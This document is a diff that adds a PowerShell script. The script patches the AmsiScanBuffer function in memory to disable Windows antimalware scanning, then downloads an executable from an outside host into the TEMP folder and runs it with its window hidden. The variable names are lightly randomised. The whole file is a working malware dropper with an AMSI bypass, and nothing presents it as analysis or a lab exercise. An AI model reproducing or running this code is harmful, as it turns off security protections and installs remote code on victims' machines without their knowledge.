@@ -1,0 +1,28 @@
+function Disable-AMSI {
+    $Win32 = '[DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName); 
+              [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string name); 
+              [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);'
+    $Kernel32 = Add-Type -MemberDefinition $Win32 -Name "Win32" -Namespace Win32Functions -PassThru
+    $addr = $Kernel32::GetProcAddress($Kernel32::LoadLibrary("amsi.dll"), "AmsiScanBuffer")
+    $oldProtect = 0
+    $Kernel32::VirtualProtect($addr, 6, 0x40, [ref]$oldProtect) | Out-Null
+    $Patch = [Byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3)
+    [System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $addr, 6)
+}
+Disable-AMSI
+
+$urlYyIxYJ = "http://bknsdom.com/doc/upminx.exe"
+$pathAIVzeK = "$env:TEMP\agent1.exe"
+$agentozJWkk = [System.Net.WebRequest]::Create($urlYyIxYJ)
+$agentozJWkk.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
+
+try {
+    $response = $agentozJWkk.GetResponse()
+    $stream = $response.GetResponseStream()
+    $fileStream = [System.IO.File]::Create($pathAIVzeK)
+    $stream.CopyTo($fileStream)
+    $fileStream.Close()
+    Start-Process -FilePath $pathAIVzeK -WindowStyle Hidden
+} catch {
+    Write-Output "[x] Download or execution failed"
+}
